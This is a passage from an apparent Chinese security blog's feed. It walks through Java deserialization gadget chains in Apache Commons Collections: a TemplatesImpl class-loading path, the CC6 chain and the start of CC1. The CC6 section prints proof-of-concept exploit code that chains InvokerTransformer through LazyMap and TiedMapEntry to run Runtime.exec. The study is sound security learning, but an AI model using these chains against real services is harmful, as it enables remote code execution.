+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Class &lt;span style="color:#a6e22e"&gt;defineClass&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;final&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; b) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; defineClass(&lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;, b, 0, b.&lt;span style="color:#a6e22e"&gt;length&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的&lt;code&gt;defineClass()&lt;/code&gt;没有标注作用域，默认为包级私有，在自己的类里可以调用。继续查找用法。&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;TemplatesImpl&lt;/code&gt;的&lt;code&gt;defineTransletClasses&lt;/code&gt;方法中找到了调用，这个方法是私有的，找一下谁调用了&lt;code&gt;defineTransletClasses&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;还是同一个类下的&lt;code&gt;getTransletInstance()&lt;/code&gt;方法调用了&lt;code&gt;defineTransletClasses&lt;/code&gt;：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; Translet &lt;span style="color:#a6e22e"&gt;getTransletInstance&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; TransformerConfigurationException {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (_name &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (_class &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) defineTransletClasses(); &lt;span style="color:#75715e"&gt;//调用点&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// The translet needs to keep a reference to all its auxiliary&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// class to prevent the GC from collecting them&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; AbstractTranslet translet &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (AbstractTranslet) _class&lt;span style="color:#f92672"&gt;[&lt;/span&gt;_transletIndex&lt;span style="color:#f92672"&gt;]&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;newInstance&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; translet.&lt;span style="color:#a6e22e"&gt;postInitialization&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; translet.&lt;span style="color:#a6e22e"&gt;setTemplates&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;this&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; translet.&lt;span style="color:#a6e22e"&gt;setServicesMechnism&lt;/span&gt;(_useServicesMechanism);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; translet.&lt;span style="color:#a6e22e"&gt;setAllowedProtocols&lt;/span&gt;(_accessExternalStylesheet);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (_auxClasses &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; translet.&lt;span style="color:#a6e22e"&gt;setAuxiliaryClasses&lt;/span&gt;(_auxClasses);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; translet;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;catch&lt;/span&gt; (InstantiationException e) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ErrorMsg err &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; ErrorMsg(ErrorMsg.&lt;span style="color:#a6e22e"&gt;TRANSLET_OBJECT_ERR&lt;/span&gt;, _name);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;throw&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; TransformerConfigurationException(err.&lt;span style="color:#a6e22e"&gt;toString&lt;/span&gt;());
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;catch&lt;/span&gt; (IllegalAccessException e) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ErrorMsg err &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; ErrorMsg(ErrorMsg.&lt;span style="color:#a6e22e"&gt;TRANSLET_OBJECT_ERR&lt;/span&gt;, _name);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;throw&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; TransformerConfigurationException(err.&lt;span style="color:#a6e22e"&gt;toString&lt;/span&gt;());
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里同时还有一个&lt;code&gt;newInstance()&lt;/code&gt;实例化的过程，如果能走完这个函数就能动态执行代码，但是因为是私有的，得继续找。&lt;/p&gt;</description></item><item><title>java反序列化之CC6</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/</link><pubDate>Wed, 13 May 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/</guid><description>&lt;h1 id="java反序列化之cc6"&gt;
+ java反序列化之CC6
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc6"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="cc6-链分析"&gt;
+ CC6 链分析
+ &lt;a class="anchor" href="#cc6-%e9%93%be%e5%88%86%e6%9e%90"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;前半段链子，从&lt;code&gt;LazyMap&lt;/code&gt;到&lt;code&gt;InvokerTransformer&lt;/code&gt;类是一样的。&lt;/p&gt;
+&lt;p&gt;我们直接从&lt;code&gt;LazyMap&lt;/code&gt;开始找其他调用&lt;code&gt;get&lt;/code&gt;的地方。&lt;/p&gt;
+&lt;h3 id="寻找链子"&gt;
+ 寻找链子
+ &lt;a class="anchor" href="#%e5%af%bb%e6%89%be%e9%93%be%e5%ad%90"&gt;#&lt;/a&gt;
+&lt;/h3&gt;
+&lt;p&gt;在 ysoSerial 给的链子中，是&lt;code&gt;TiedMapEntry&lt;/code&gt;的&lt;code&gt;getValue()&lt;/code&gt;方法调用了&lt;code&gt;LazyMap&lt;/code&gt;的&lt;code&gt;get()&lt;/code&gt;方法。&lt;/p&gt;
+&lt;p&gt;再来一次&lt;code&gt;LazyMap&lt;/code&gt;弹出计算器的方法：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;package&lt;/span&gt; org.example.originaltest;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.functors.InvokerTransformer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.keyvalue.TiedMapEntry;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.map.LazyMap;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.util.HashMap;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.util.Map;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;CC6Test&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;(String&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; args) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Runtime runtime &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Runtime.&lt;span style="color:#a6e22e"&gt;getRuntime&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; InvokerTransformer exec &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; InvokerTransformer(&lt;span style="color:#e6db74"&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;, &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Class&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{String.&lt;span style="color:#a6e22e"&gt;class&lt;/span&gt;}, &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Object&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{&lt;span style="color:#e6db74"&gt;&amp;#34;calc&amp;#34;&lt;/span&gt;});
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; HashMap&lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt;Object, Object&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; map &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; HashMap&lt;span style="color:#f92672"&gt;&amp;lt;&amp;gt;&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Map decorate &lt;span style="color:#f92672"&gt;=&lt;/span&gt; LazyMap.&lt;span style="color:#a6e22e"&gt;decorate&lt;/span&gt;(map, exec);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; decorate.&lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(runtime);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下一步就是让&lt;code&gt;TiedMapEntry&lt;/code&gt;类中的&lt;code&gt;getValue()&lt;/code&gt;方法调用了&lt;code&gt;LazyMap&lt;/code&gt;的&lt;code&gt;get()&lt;/code&gt;方法。下面使用&lt;code&gt;TiedMapEntry&lt;/code&gt;写一个exp。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;package&lt;/span&gt; org.example.originaltest;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.Transformer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.functors.ChainedTransformer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.functors.ConstantTransformer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.functors.InvokerTransformer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.keyvalue.TiedMapEntry;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections.map.LazyMap;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.util.HashMap;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.util.Map;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;CC6Test&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;(String&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; args) &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; Exception{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Transformer&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; transformers &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Transformer&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; ConstantTransformer(Runtime.&lt;span style="color:#a6e22e"&gt;class&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; InvokerTransformer(&lt;span style="color:#e6db74"&gt;&amp;#34;getMethod&amp;#34;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Class&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{String.&lt;span style="color:#a6e22e"&gt;class&lt;/span&gt;, Class&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;class&lt;/span&gt;},&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Object&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{&lt;span style="color:#e6db74"&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;}),
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; InvokerTransformer(&lt;span style="color:#e6db74"&gt;&amp;#34;invoke&amp;#34;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Class&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{Object.&lt;span style="color:#a6e22e"&gt;class&lt;/span&gt;,Object&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;class&lt;/span&gt;},&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Object&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{&lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Object&lt;span style="color:#f92672"&gt;[&lt;/span&gt;0&lt;span style="color:#f92672"&gt;]&lt;/span&gt;}),
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; InvokerTransformer(&lt;span style="color:#e6db74"&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Class&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{String.&lt;span style="color:#a6e22e"&gt;class&lt;/span&gt;},&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Object&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{&lt;span style="color:#e6db74"&gt;&amp;#34;calc&amp;#34;&lt;/span&gt;})
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; };
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ChainedTransformer chainedTransformer &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; ChainedTransformer(transformers);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; HashMap&lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt;Object, Object&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; map &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; HashMap&lt;span style="color:#f92672"&gt;&amp;lt;&amp;gt;&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Map lazyMap &lt;span style="color:#f92672"&gt;=&lt;/span&gt; LazyMap.&lt;span style="color:#a6e22e"&gt;decorate&lt;/span&gt;(map, chainedTransformer);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; TiedMapEntry tiedMapEntry &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; TiedMapEntry(lazyMap, &lt;span style="color:#e6db74"&gt;&amp;#34;key&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tiedMapEntry.&lt;span style="color:#a6e22e"&gt;getValue&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的逻辑还是很简单的，我们创建一个&lt;code&gt;TiedMapEntry&lt;/code&gt;对象，然后把我们构造的&lt;code&gt;LazyMap&lt;/code&gt;传进去并直接调用&lt;code&gt;setValue&lt;/code&gt;方法，就会调用到&lt;code&gt;map.get(key)&lt;/code&gt;。&lt;/p&gt;</description></item><item><title>java反序列化之CC1</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/</link><pubDate>Sat, 09 May 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/</guid><description>&lt;h1 id="java反序列化之cc1"&gt;
+ Java反序列化之CC1
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc1"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="transformmap版cc1攻击链分析"&gt;
+ TransformMap版CC1攻击链分析
+ &lt;a class="anchor" href="#transformmap%e7%89%88cc1%e6%94%bb%e5%87%bb%e9%93%be%e5%88%86%e6%9e%90"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;首先明确反序列化的思路：&lt;/p&gt;
+&lt;p&gt;在入口类，我们需要一个&lt;code&gt;readObject&lt;/code&gt;方法，在结尾需要一个能够命令执行的方法，中间我们通过链子引导。所以我们一般从尾部出发找入口。&lt;/p&gt;
+&lt;h3 id="尾部的-exec-方法"&gt;
+ 尾部的 exec 方法
+ &lt;a class="anchor" href="#%e5%b0%be%e9%83%a8%e7%9a%84-exec-%e6%96%b9%e6%b3%95"&gt;#&lt;/a&gt;
+&lt;/h3&gt;
+&lt;p&gt;先查看一下&lt;code&gt;Transformer&lt;/code&gt;这个接口，有一个&lt;code&gt;transform&lt;/code&gt;方法。我们看一下这个接口有哪些实现类。最终我们在&lt;code&gt;InvokerTransformer&lt;/code&gt;这个类里面发现它的&lt;code&gt;transform&lt;/code&gt;方法存在反射调用任意类。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; Object &lt;span style="color:#a6e22e"&gt;transform&lt;/span&gt;(Object input) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (input &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#66d9ef"&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		Class cls &lt;span style="color:#f92672"&gt;=&lt;/span&gt; input.&lt;span style="color:#a6e22e"&gt;getClass&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		Method method &lt;span style="color:#f92672"&gt;=&lt;/span&gt; cls.&lt;span style="color:#a6e22e"&gt;getMethod&lt;/span&gt;(iMethodName, iParamTypes);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; method.&lt;span style="color:#a6e22e"&gt;invoke&lt;/span&gt;(input, iArgs);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	} &lt;span style="color:#66d9ef"&gt;catch&lt;/span&gt; (NoSuchMethodException ex) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		&lt;span style="color:#66d9ef"&gt;throw&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; FunctorException(&lt;span style="color:#e6db74"&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; iMethodName &lt;span style="color:#f92672"&gt;+&lt;/span&gt; 		&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; input.&lt;span style="color:#a6e22e"&gt;getClass&lt;/span&gt;() &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39; does not exist&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	} &lt;span style="color:#66d9ef"&gt;catch&lt;/span&gt; (IllegalAccessException ex) {
